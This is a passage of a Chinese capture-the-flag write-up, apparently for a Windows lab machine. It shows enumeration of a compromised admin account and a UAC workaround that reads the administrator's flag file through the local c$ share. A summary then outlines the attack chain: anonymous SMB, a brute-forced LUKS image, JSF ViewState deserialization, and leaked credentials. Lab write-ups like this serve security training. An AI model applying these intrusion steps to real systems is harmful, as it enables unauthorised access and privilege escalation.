+<div class="highlight"><pre><span></span><code><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>C:\Users\Batman\Documents&gt;net user batman
+<a id="__codelineno-41-2" name="__codelineno-41-2" href="#__codelineno-41-2"></a>net user batman
+<a id="__codelineno-41-3" name="__codelineno-41-3" href="#__codelineno-41-3"></a>User name                    Batman
+<a id="__codelineno-41-4" name="__codelineno-41-4" href="#__codelineno-41-4"></a>Full Name
+<a id="__codelineno-41-5" name="__codelineno-41-5" href="#__codelineno-41-5"></a>Comment
+<a id="__codelineno-41-6" name="__codelineno-41-6" href="#__codelineno-41-6"></a>User&#39;s comment
+<a id="__codelineno-41-7" name="__codelineno-41-7" href="#__codelineno-41-7"></a>Country/region code          001 (United States)
+<a id="__codelineno-41-8" name="__codelineno-41-8" href="#__codelineno-41-8"></a>Account active               Yes
+<a id="__codelineno-41-9" name="__codelineno-41-9" href="#__codelineno-41-9"></a>Account expires              Never
+<a id="__codelineno-41-10" name="__codelineno-41-10" href="#__codelineno-41-10"></a>
+<a id="__codelineno-41-11" name="__codelineno-41-11" href="#__codelineno-41-11"></a>Password last set            2/3/2019 9:25:50 AM
+<a id="__codelineno-41-12" name="__codelineno-41-12" href="#__codelineno-41-12"></a>Password expires             Never
+<a id="__codelineno-41-13" name="__codelineno-41-13" href="#__codelineno-41-13"></a>Password changeable          2/3/2019 9:25:50 AM
+<a id="__codelineno-41-14" name="__codelineno-41-14" href="#__codelineno-41-14"></a>Password required            Yes
+<a id="__codelineno-41-15" name="__codelineno-41-15" href="#__codelineno-41-15"></a>User may change password     Yes
+<a id="__codelineno-41-16" name="__codelineno-41-16" href="#__codelineno-41-16"></a>
+<a id="__codelineno-41-17" name="__codelineno-41-17" href="#__codelineno-41-17"></a>Workstations allowed         All
+<a id="__codelineno-41-18" name="__codelineno-41-18" href="#__codelineno-41-18"></a>Logon script
+<a id="__codelineno-41-19" name="__codelineno-41-19" href="#__codelineno-41-19"></a>User profile
+<a id="__codelineno-41-20" name="__codelineno-41-20" href="#__codelineno-41-20"></a>Home directory
+<a id="__codelineno-41-21" name="__codelineno-41-21" href="#__codelineno-41-21"></a>Last logon                   8/8/2019 12:45:38 AM
+<a id="__codelineno-41-22" name="__codelineno-41-22" href="#__codelineno-41-22"></a>
+<a id="__codelineno-41-23" name="__codelineno-41-23" href="#__codelineno-41-23"></a>Logon hours allowed          All
+<a id="__codelineno-41-24" name="__codelineno-41-24" href="#__codelineno-41-24"></a>
+<a id="__codelineno-41-25" name="__codelineno-41-25" href="#__codelineno-41-25"></a>Local Group Memberships      *Administrators       *Remote Management Use
+<a id="__codelineno-41-26" name="__codelineno-41-26" href="#__codelineno-41-26"></a>                             *Users
+<a id="__codelineno-41-27" name="__codelineno-41-27" href="#__codelineno-41-27"></a>Global Group memberships     *None
+<a id="__codelineno-41-28" name="__codelineno-41-28" href="#__codelineno-41-28"></a>The command completed successfully.
+</code></pre></div>
+<p>该用户拥有管理员和远程管理员权限，但是读取 root.txt 时无法访问 administrator 的桌面</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>dir c:\Users\administrator\Desktop
+<a id="__codelineno-42-2" name="__codelineno-42-2" href="#__codelineno-42-2"></a>type c:\Users\administrator\Desktop\root.txt
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>PS C:\Users\Batman\Documents&gt; type \users\administrator\desktop\root.txt
+<a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Access is denied
+<a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>At line:1 char:1
+<a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>+ type \users\administrator\desktop\root.txt
+<a id="__codelineno-43-5" name="__codelineno-43-5" href="#__codelineno-43-5"></a>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<a id="__codelineno-43-6" name="__codelineno-43-6" href="#__codelineno-43-6"></a>    + CategoryInfo          : PermissionDenied: (C:\users\administrator\desktop\root.txt:String) [Get-Content], UnauthorizedAccessException
+<a id="__codelineno-43-7" name="__codelineno-43-7" href="#__codelineno-43-7"></a>    + FullyQualifiedErrorId : ItemExistsUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand
+<a id="__codelineno-43-8" name="__codelineno-43-8" href="#__codelineno-43-8"></a>Cannot find path &#39;C:\users\administrator\desktop\root.txt&#39; because it does not exist.
+<a id="__codelineno-43-9" name="__codelineno-43-9" href="#__codelineno-43-9"></a>At line:1 char:1
+<a id="__codelineno-43-10" name="__codelineno-43-10" href="#__codelineno-43-10"></a>+ type \users\administrator\desktop\root.txt
+<a id="__codelineno-43-11" name="__codelineno-43-11" href="#__codelineno-43-11"></a>+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+<a id="__codelineno-43-12" name="__codelineno-43-12" href="#__codelineno-43-12"></a>    + CategoryInfo          : ObjectNotFound: (C:\users\administrator\desktop\root.txt:String) [Get-Content], ItemNotFoundException
+<a id="__codelineno-43-13" name="__codelineno-43-13" href="#__codelineno-43-13"></a>    + FullyQualifiedErrorId : PathNotFound,Microsoft.PowerShell.Commands.GetContentCommand
+</code></pre></div>
+<p>查询权限，判断当前环境为受限状态且 UAC 状态已经启用</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>PS C:\Users\Batman\Documents&gt; whoami /priv
+<a id="__codelineno-44-2" name="__codelineno-44-2" href="#__codelineno-44-2"></a>
+<a id="__codelineno-44-3" name="__codelineno-44-3" href="#__codelineno-44-3"></a>PRIVILEGES INFORMATION
+<a id="__codelineno-44-4" name="__codelineno-44-4" href="#__codelineno-44-4"></a>----------------------
+<a id="__codelineno-44-5" name="__codelineno-44-5" href="#__codelineno-44-5"></a>
+<a id="__codelineno-44-6" name="__codelineno-44-6" href="#__codelineno-44-6"></a>Privilege Name                Description                    State  
+<a id="__codelineno-44-7" name="__codelineno-44-7" href="#__codelineno-44-7"></a>============================= ============================== =======
+<a id="__codelineno-44-8" name="__codelineno-44-8" href="#__codelineno-44-8"></a>SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+<a id="__codelineno-44-9" name="__codelineno-44-9" href="#__codelineno-44-9"></a>SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+</code></pre></div>
+<p>通过本地共享读取root.txt</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>type \\localhost\c$\users\administrator\desktop\root.txt
+</code></pre></div>
+<p><img alt="截图" src="3e05c9ecc92a6d0e2638f3d49973a7ec.png" /></p>
+<h1 id="_6">总结<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h1>
+<p>smb匿名登陆后发现lucks镜像，成功爆破lucks密码后挂载该镜像，在其中查看相关配置信息。站点中存在JSF ViewState反序列化漏洞，虽然数据是加密的，但是它提供了一个用于执行攻击的密钥从而能够成功获取用户权限，在靶机中发现zip压缩文件，解压后是一个mbox文件，打开该邮件后发现其中存储了管理员的账号密码，通过该账号密码借助powershell上线，成功获取管理员权限，但是其中存在UAC限制，最终可使用msf或本地共享绕过UAC拿到flag。</p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  回到页面顶部
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Copyright &copy; 2024 hypnotic
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    <script id="__config" type="application/json">{"base": "../../..", "features": ["header.autohide", "navigation.instant", "navigation.tracking", "content.code.annotate", "toc.integrate", "toc.follow", "navigation.path", "navigation.top", "navigation.tabs", "navigation.prune", "navigation.footer", "navigation.tabs.sticky", "navigation.sections", "content.code.copy", "navigation.indexes", "search.share", "search.suggest", "search.highlight"], "search": "../../../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "\u5df2\u590d\u5236", "clipboard.copy": "\u590d\u5236", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.term.missing": "\u7f3a\u5c11", "select.version": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}}</script>
+    
+    
+      <script src="../../../assets/javascripts/bundle.83f73b43.min.js"></script>
+      
+        <script src="../../../javascripts/extra.js"></script>
+      
+        <script src="../../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
